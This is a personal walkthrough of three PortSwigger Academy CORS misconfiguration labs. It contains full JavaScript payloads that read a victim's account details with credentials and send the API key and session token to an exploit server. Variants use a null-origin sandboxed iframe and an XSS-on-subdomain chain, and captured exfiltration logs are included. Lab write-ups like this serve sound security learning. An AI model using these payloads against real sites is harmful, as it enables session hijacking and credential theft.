resource: 
- [lab and concept](https://youtu.be/RKe6r63OxXw)
- [medium writeup](https://medium.com/@relzy/day-4-of-portswigger-academy-lab-walkthrough-cors-xxe-injection-6c7d85302e86)

##### Lab 1:
Tried to check whether the browser actually implements CORS.
Turns out it does, by looking at all the captured requests and seeing the CORS Header in the http response tab.

![[Pasted image 20260903221143.png]]

Sent the request to repeater and added origin: https://sha-bang.com

Browser response:
`Access-Control-Allow-Origin: https://sha-bang.com`
![[Pasted image 20260903222014.png]]

Therefore the browser allows an external origin to read the cookies as 
`Access-Control-Allow-Origin: https://sha-bang.com`
`Access-Control-Allow-Credentials: true`

Until now we checked whether the CORS could be misconfigured. Now we move to the actual exploit using JavaScript.

Click on "Go to exploit server"
You'll get redirected to another page where you'll draft the payload

Payload:
<script>
var req= new XMLHttpRequest();
req.onload= reqmethod;
req.open('get','https://0aa7008304e47309829dfb4500af008f.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();
function reqmethod() {
location='https://exploit-0a0800a2041e73b882b9faa8015600db.exploit-server.net/log?key='+this.responseText
};
</script>

Click "store" and "deliver exploit to the victim".
Now click on "view access logs" and look for something similar to administrator
![[Pasted image 20260903224726.png]]

`2026-09-03 17:15:19 +0000 "GET /log?key={%20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%228rEpfPItZ03Rg8z9IRktKWMF2B6dy3me%22,%20%20%22sessions%22:%20[%20%20%20%20%2254qlzEGnxPzk8ojppGhQPnRexKn8rWZI%22%20%20]} HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"`

api key: 8rEpfPItZ03Rg8z9IRktKWMF2B6dy3me
session cookie: 54qlzEGnxPzk8ojppGhQPnRexKn8rWZI

this is because the response in the above image also had api key 1st and then the session cookie.

Now submit the api key in the lab.
Lab solved!!!
![[Pasted image 20260903230623.png]]

##### Lab2:
Again checked whether the browser implemented the CORS 
![[Pasted image 20260903232134.png]]

Now sent the request to repeater to check for CORS Misconfiguration by adding
`Origin: null` as mentioned in the lab.
![[Pasted image 20260903232315.png]]

Time for the exploit using JavaScript

payload:
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script> 
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://0aab00970407a05c806276a400f000fa.web-security-academy.net/accountDetails',true); req.withCredentials = true; 
req.send(); 
function reqListener() { location='https://exploit-0a0000520446a0f58028755f01750053.exploit-server.net/log?key='+encodeURIComponent(this.responseText); 
}; 
</script>"></iframe>

![[Pasted image 20260903233222.png]]
`"GET /log?key=%7B%0A%20%20%22username%22%3A%20%22administrator%22%2C%0A%20%20%22email%22%3A%20%22%22%2C%0A%20%20%22apikey%22%3A%20%22otg4wcODGqO1RmbPpCcSHJEvzkal8zK9%22%2C%0A%20%20%22sessions%22%3A%20%5B%0A%20%20%20%20%22hBYiIVTbrf0wmOHgAZ2fEshh8k556sZ6%22%0A%20%20%5D%0A%7D HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"`

Got the api key again. Hurray!!!

###### Learnings:
I made a rookie mistake here of not checking whether the browser allows `Access-Control-Allow-Origin: htts://sha-bang.com` and went directly for `Access-Control-Allow-Origin: null` 

So the learning here was that I needed to check for every possible misconfiguration not just the `allow origin: null`  as mentioned in the lab. Need to think as a black box tester with no knowledge of the system and check for every possible vulnerability.

You can also check for `Access-Control-Allow-Origin: *`


##### Lab3:

Rectified my rookie mistake this time, by checking every allow origin header i.e. `Access-Control-Allow-Origin: null`
`Access-Control-Allow-Origin: https://sha-bang.com`
`Access-Control-Allow-Origin: *`
![[Pasted image 20260904113450.png]]![[Pasted image 20260904113629.png]]![[Pasted image 20260904114014.png]]

Check for same body with a different scheme/protocol and different domain/subdomain as well
![[Pasted image 20260904114416.png]]![[Pasted image 20260904114827.png]]

Vulnerable to XSS
https://stock.0ab500b5040f90c980f7c381000b000e.web-security-academy.net/?productId=1&storeId=1
![[Pasted image 20260904121631.png]]

<script>
document.location="https://stock.0ab500b5040f90c980f7c381000b000e.web-security-academy.net/?productId=<script>
var req= new XMLHttpRequest();
req.onload= reqmethod;
req.open('get','https://0aa7008304e47309829dfb4500af008f.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();
function reqmethod() {
location='https://exploit-0a0800a2041e73b882b9faa8015600db.exploit-server.net/log?key='+this.responseText
};
</script>&storeId=1
</script>

But this code won't work because
So we need to do url encoding. For that purpose go to decoder of burp type the special character and replace them with their url encoded equivalent.

![[Pasted image 20260904122645.png]]

URL Encoded Code:

<script>
document.location="https://stock.0ab500b5040f90c980f7c381000b000e.web-security-academy.net/?productId=<script>
var req= new XMLHttpRequest();
req.onload= reqmethod;
req.open('get','https://0ab500b5040f90c980f7c381000b000e.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();
function reqmethod() {
location='https://exploit-0af500fa04e4907780c2c2e1011d00a8.exploit-server.net/log?key='%2bthis.responseText
};
%3c/script>&storeId=1
</script>

Firstly we're redirecting the user to this url
<script> document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1" </script>

Then within the url we're running a script to get the account details from stock.xyz as this domain is allowed to request resources from the browser

"http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1" 

Using the portswigger academy's payload/script

![[Pasted image 20260904124348.png]]

`"GET /log?key={%20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%22SDwcWNFtIOj550zdaEz3m8AITd4fNMXY%22,%20%20%22sessions%22:%20[%20%20%20%20%224Uqg9U9cHjkhJHrp8GvaaLN4A22gXZz9%22%20%20]} HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"`

Lab Solved!!!
